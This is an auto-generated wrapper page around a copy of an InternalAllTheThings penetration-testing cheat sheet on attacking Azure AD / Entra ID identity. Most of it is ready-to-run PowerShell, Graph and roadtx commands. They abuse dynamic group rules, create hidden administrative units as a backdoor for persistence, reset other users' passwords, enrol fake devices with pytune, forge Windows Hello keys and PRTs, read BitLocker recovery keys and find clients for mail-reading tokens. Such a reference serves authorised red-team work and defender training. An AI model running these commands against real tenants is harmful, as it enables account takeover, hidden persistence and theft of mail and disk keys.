---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Azure AD - IAM

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-cloud-azure-azure-devices-users-sp` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/cloud/azure/azure-devices-users-sp.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Azure AD - IAM](../../topics/cloud/azure-ad-iam.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-cloud-azure-azure-devices-users-sp |
| name | Azure AD - IAM |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/cloud/azure/azure-devices-users-sp.md |

## Preserved Source Material

````yaml
_body: "# Azure AD - IAM\n\n> Root Management Group (Tenant) > Management Group > Subscription > Resource Group > Resource\n\
  \n* Users (User, Groups, Dynamic Groups)\n* Devices\n* Service Principals (Application and Managed Identities)\n\n## Users\n\
  \n* List users: `Get-AzureADUser -All $true`\n* Enumerate groups\n\n    ```ps1\n    # List groups\n    Get-AzureADGroup\
  \ -All $true\n    \n    # Get members of a group\n    Get-AzADGroup -DisplayName '<GROUP-NAME>'\n    Get-AzADGroupMember\
  \ -GroupDisplayName '<GROUP-NAME>' | select UserPrincipalName\n    ```\n\n* Enumerate roles: `Get-AzureADDirectoryRole -Filter\
  \ \"DisplayName eq 'Global Administrator'\" | Get-AzureADDirectoryRoleMember`\n* List roles: `Get-AzureADMSRoleDefinition\
  \ | ?{$_.IsBuiltin -eq $False} | select DisplayName`\n* Add user to a group\n\n    ```ps1\n    $groupid = \"<group-id>\"\
  \n    $targetmember = \"<user-id>\"\n    $group = Get-MgGroup -GroupId $groupid\n    $members = Get-MgGroupMember -GroupId\
  \ $groupid\n    New-MgGroupMember -GroupId $groupid -DirectoryObjectid $targetmember\n    ```\n\n### Dynamic Group Membership\n\
  \nGet groups that allow Dynamic membership:\n\n* Powershell Azure AD: `Get-AzureADMSGroup | ?{$_.GroupTypes -eq 'DynamicMembership'}`\n\
  * RoadRecon database: `select objectId, displayName, description, membershipRule, membershipRuleProcessingState, isMembershipRuleLocked\
  \ from groups where membershipRule is not null;`\n\nRule example : `(user.otherMails -any (_ -contains \"vendor\")) -and\
  \ (user.userType -eq \"guest\")`\nRule description: Any Guest user whose secondary email contains the string 'vendor' will\
  \ be added to the group\n\n1. Open user's profile, click on **Manage**\n2. Click on **Resend** invite and to get an invitation\
  \ URL\n3. Set the secondary email\n\n    ```powershell\n    PS> Set-AzureADUser -ObjectId <OBJECT-ID> -OtherMails <Username>@<TENANT\
  \ NAME>.onmicrosoft.com -Verbose\n    ```\n\n### Administrative Unit\n\nEnumerate Administrative Units.\n\n```ps1\nPS AzureAD>\
  \ Get-AzureADMSAdministrativeUnit -All $true\nPS AzureAD> Get-AzureADMSAdministrativeUnit -Id <ID>\nPS AzureAD> Get-AzureADMSAdministrativeUnitMember\
  \ -Id <ID>\nPS AzureAD> Get-AzureADMSScopedRoleMembership -Id <ID> | fl\nPS AzureAD> Get-AzureADDirectoryRole -ObjectId\
  \ <RoleId>\nPS AzureAD> Get-AzureADUser -ObjectId <RoleMemberInfo.Id> | fl\n```\n\nAdministrative Unit can be used as a\
  \ persistence mechanism. When the `visibility` attribute is set to `HiddenMembership`, only members of the administrative\
  \ unit can list other members of the administrative unit.\n\n```ps1\naz rest \\\n  --method post \\\n  --url https://graph.microsoft.com/v1.0/directory/administrativeUnits\
  \ \\\n  --body '{\"displayName\": \"Hidden AU Administrative Unit\", \"isMemberManagementRestricted\":false, \"visibility\"\
  : \"HiddenMembership\"}'\n```\n\n* Create a new Administrative Unit using the `New-MgDirectoryAdministrativeUnit` cmdlet.\n\
  \n    ```ps1\n    Connect-MgGraph -Scopes \"AdministrativeUnit.ReadWrite.All\"\n    Import-Module Microsoft.Graph.Identity.DirectoryManagement\n\
  \n    $params = @{\n        displayName = \"Marketing Department\"\n        description = \"Marketing Department Administration\"\
  \n        visibility = \"HiddenMembership\"\n    }\n\n    New-MgDirectoryAdministrativeUnit -BodyParameter $params\n   \
  \ ```\n\n* Add a member with `New-MgDirectoryAdministrativeUnitMemberByRef`\n\n    ```ps1\n    Connect-MgGraph -Scopes \"\
  AdministrativeUnit.ReadWrite.All\"\n    Import-Module Microsoft.Graph.Identity.DirectoryManagement\n\n    $administrativeUnitId\
  \ = \"0b22c83d-c5ac-43f2-bb6e-88af3016d49f\"\n    $paramsUser1 = @{\n        \"@odata.id\" = \"https://graph.microsoft.com/v1.0/users/52e26d18-d251-414f-af14-a4a93123b2b2\"\
  \n    }\n    New-MgDirectoryAdministrativeUnitMemberByRef -AdministrativeUnitId $administrativeUnitId -BodyParameter $paramsUser1\n\
  \    ```\n\n* List members even when the administrative unit is hidden.\n\n    ```ps1\n    Connect-MgGraph -Scopes \"AdministrativeUnit.Read.All\"\
  , \"Member.Read.Hidden\", \"Directory.Read.All\"\n    Import-Module Microsoft.Graph.Identity.DirectoryManagement\n\n   \
  \ $administrativeUnitId = \"0b22c83d-c5ac-43f2-bb6e-88af3016d49f\"\n    Get-MgDirectoryAdministrativeUnitMemberAsUser -AdministrativeUnitId\
  \ $administrativeUnitId\n    ```\n\n* Assign the `User Administrator` role, its ID is `947ccf23-ee27-4951-8110-96c62c680311`\
  \ in this tenant.\n\n    ```ps1\n    Connect-MgGraph -Scopes \"RoleManagement.ReadWrite.Directory\"\n    Import-Module Microsoft.Graph.Identity.DirectoryManagement\n\
  \n    $administrativeUnitId = \"0b22c83d-c5ac-43f2-bb6e-88af3016d49f\"\n    $userAdministratorRoleId = \"947ccf23-ee27-4951-8110-96c62c680311\"\
  \n    $params = @{\n        roleId = $userAdministratorRoleId\n        roleMemberInfo = @{\n            id = \"61b0d52f-a902-4769-9a09-c6528336b00a\"\
  \n        }\n    }\n\n    New-MgDirectoryAdministrativeUnitScopedRoleMember -AdministrativeUnitId $administrativeUnitId\
  \ -BodyParameter $params\n    ```\n\n* Now the user with the id `61b0d52f-a902-4769-9a09-c6528336b00a` can edit the property\
  \ of the other users in the Administrative Units.\n\nAdministrative Units can reset password of another user.\n\n```powershell\n\
  PS C:\\Tools> $password = \"Password\" | ConvertToSecureString -AsPlainText -Force\nPS C:\\Tools> (Get-AzureADUser -All\
  \ $true | ?{$_.UserPrincipalName -eq \"<Username>@<TENANT NAME>.onmicrosoft.com\"}).ObjectId | SetAzureADUserPassword -Password\
  \ $Password -Verbose\n```\n\n### Convert GUID to SID\n\nThe user's Entra ID is translated to SID by concatenating `\"S-1–12–1-\"\
  ` to the decimal representation of each section of the Entra ID.\n\n```powershell\nGUID: [base16(a1)]-[base16(a2)]-[ base16(a3)]-[base16(a4)]\n\
  SID: S-1–12–1-[base10(a1)]-[ base10(a2)]-[ base10(a3)]-[ base10(a4)]\n```\n\nFor example, the representation of `6aa89ecb-1f8f-4d92–810d-b0dce30b6c82`\
  \ is `S-1–12–1–1789435595–1301421967–3702525313–2188119011`\n\n## Devices\n\n### List Devices\n\n```ps1\nConnect-AzureAD\n\
  Get-AzureADDevice\n$user = Get-AzureADUser -SearchString \"username\"\nGet-AzureADUserRegisteredDevice -ObjectId $user.ObjectId\
  \ -All $true\n```\n\n### Device State\n\n```ps1\nPS> dsregcmd.exe /status\n+----------------------------------------------------------------------+\n\
  | Device State |\n+----------------------------------------------------------------------+\n AzureAdJoined : YES\n EnterpriseJoined\
  \ : NO\n DomainJoined : NO\n Device Name : jumpvm\n```\n\n* [**Azure AD Joined**](https://pbs.twimg.com/media/EQZv62NWAAEQ8wE?format=jpg&name=large)\n\
  * [**Workplace Joined**](https://pbs.twimg.com/media/EQZv7UHXsAArdhn?format=jpg&name=large)\n* [**Hybrid Joined**](https://pbs.twimg.com/media/EQZv77jXkAAC4LK?format=jpg&name=large)\n\
  * [**Workplace joined on AADJ or Hybrid**](https://pbs.twimg.com/media/EQZv8qBX0AAMWuR?format=jpg&name=large)\n\n### Join\
  \ Devices\n\n[Enroll Windows 10/11 devices in Intune](https://learn.microsoft.com/en-us/mem/intune/user-help/enroll-windows-10-device)\n\
  \n* [secureworks/pytune](https://github.com/secureworks/pytune) - Pytune is a post-exploitation tool for enrolling a fake\
  \ device into Intune with mulitple platform support.\n\n    ```ps1\n    usage: pytune.py [-h] {entra_join,entra_delete,enroll_intune,checkin,retire_intune,check_compliant,download_apps}\
  \ ...\n\n    python3 pytune.py entra_join -o Windows -d Windows_pytune -u testuser@*******.onmicrosoft.com -p ***********\n\
  \    python3 pytune.py enroll_intune -o Windows -d Windows_pytune -c Windows_pytune.pfx -u testuser@*******.onmicrosoft.com\
  \ -p ***********\n    python3 pytune.py checkin -o Windows -d Windows_pytune -c Windows_pytune.pfx -m Windows_pytune_mdm.pfx\
  \ -u testuser@*******.onmicrosoft.com -p ***********\n    python3 pytune.py check_compliant -o Windows -c Windows_pytune.pfx\
  \ -u testuser@*******.onmicrosoft.com -p ***********\n    python3 pytune.py check_compliant -o Windows -c Windows_pytune.pfx\
  \ -u testuser@*******.onmicrosoft.com -p *********** -H $HWHASH\n    ```\n\n### Register Devices\n\n```ps1\nroadtx device\
  \ -a register -n swkdeviceup\n```\n\n### Windows Hello for Business\n\n```ps1\nroadtx.exe prtenrich --ngcmfa-drs-auth\n\
  roadtx.exe winhello -k swkdevicebackdoor.key\nroadtx.exe prt -hk swkdevicebackdoor.key -u <user@domain.lab> -c swkdeviceup.pem\
  \ -k swkdeviceup.key\nroadtx browserprtauth --prt <prt-token> --prt-sessionkey <prt-session-key> --keep-open -url https://portal.azure.com\n\
  ```\n\n### Bitlocker Keys\n\n```ps1\nInstall-Module Microsoft.Graph -Scope CurrentUser\nImport-Module Microsoft.Graph.Identity.SignIns\n\
  Connect-MgGraph -Scopes BitLockerKey.Read.All\nGet-MgInformationProtectionBitlockerRecoveryKey -All\nGet-MgInformationProtectionBitlockerRecoveryKey\
  \ -BitlockerRecoveryKeyId $bitlockerRecoveryKeyId\n```\n\n## Service Principals\n\n```ps1\nPS C:\\> Get-AzureADServicePrincipal\n\
  \nObjectId                             AppId                                DisplayName\n--------                      \
  \       -----                                -----------\n00221b6f-4387-4f3f-aa85-34316ad7f956 e5e29b8a-85d9-41ea-b8d1-2162bd004528\
  \ Tenant Schema Extension App\n012f6450-15be-4e45-b8b4-e630f0fb70fe 00000005-0000-0ff1-ce00-000000000000 Microsoft.YammerEnterprise\n\
  06ab01eb-3e77-4d14-ae31-322c7730a65b 09abbdfd-ed23-44ee-a2d9-a627aa1c90f3 ProjectWorkManagement\n092aaf41-23e8-46eb-8c3d-fc0ee91cc62f\
  \ 507bc9da-c4e2-40cb-96a7-ac90df92685c Office365Reports\n0ac66e69-5502-4406-a294-6dedeadc8cab 2cf9eb86-36b5-49dc-86ae-9a63135dfa8c\
  \ AzureTrafficManagerandDNS\n0c0a6d9d-48c0-4aa7-b484-4e46f77d8ed9 0f698dd4-f011-4d23-a33e-b36416dcb1e6 Microsoft.OfficeClientService\n\
  0cbef08e-a4b5-4dd9-865e-8f521c1c5fb4 0469d4cd-df37-4d93-8a61-f8c75b809164 Microsoft Policy Administration Service\n0ea80ff0-a9ea-43b6-b876-d5989efd8228\
  \ 00000009-0000-0000-c000-000000000000 Microsoft Power BI Reporting and Analytics</dev:code>\n```\n\n## Other\n\nLists all\
  \ the client IDs you can use to get a token with the `mail.read` scope on the Microsoft Graph:\n\n```ps1\nroadtx getscope\
  \ -s https://graph.microsoft.com/mail.read\nroadtx findscope -s https://graph.microsoft.com/mail.read\n```\n\n## References\n\
  \n* [Pentesting Azure Mindmap](https://github.com/synacktiv/Mindmaps)\n* [AZURE AD cheatsheet - BlackWasp](https://hideandsec.sh/books/cheatsheets-82c/page/azure-ad)\n\
  * [Moving laterally between Azure AD joined machines - Tal Maor - Mar 17, 2020](https://medium.com/@talthemaor/moving-laterally-between-azure-ad-joined-machines-ed1f8871da56)\n\
  * [AZURE AD INTRODUCTION FOR RED TEAMERS - Aymeric Palhière (bak) - 2020-04-20](https://www.synacktiv.com/posts/pentest/azure-ad-introduction-for-red-teamers.html)\n\
  * [Training - Attacking and Defending Azure Lab - Altered Security](https://www.alteredsecurity.com/azureadlab)\n* [Hidden\
  \ in Plain Sight: Abusing Entra ID Administrative Units for Sticky Persistence - Katie Knowles - September 16, 2024](https://securitylabs.datadoghq.com/articles/abusing-entra-id-administrative-units/)\n\
  * [Create Sticky Backdoor User Through Restricted Management AU - Datadog, Inc](https://stratus-red-team.cloud/attack-techniques/entra-id/entra-id.persistence.restricted-au/)\n\
  * [Unveiling the Power of Intune: Leveraging Intune for Breaking Into Your Cloud and On-Premise - Yuya Chudo - December\
  \ 11, 2024](https://i.blackhat.com/EU-24/Presentations/EU-24-Chudo-Unveiling-the-Power-of-Intune-Leveraging-Intune-for-Breaking-Into-Your-Cloud-and-On-Premise.pdf)"
_relative_path: cloud/azure/azure-devices-users-sp.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/cloud/azure/azure-devices-users-sp.md
````
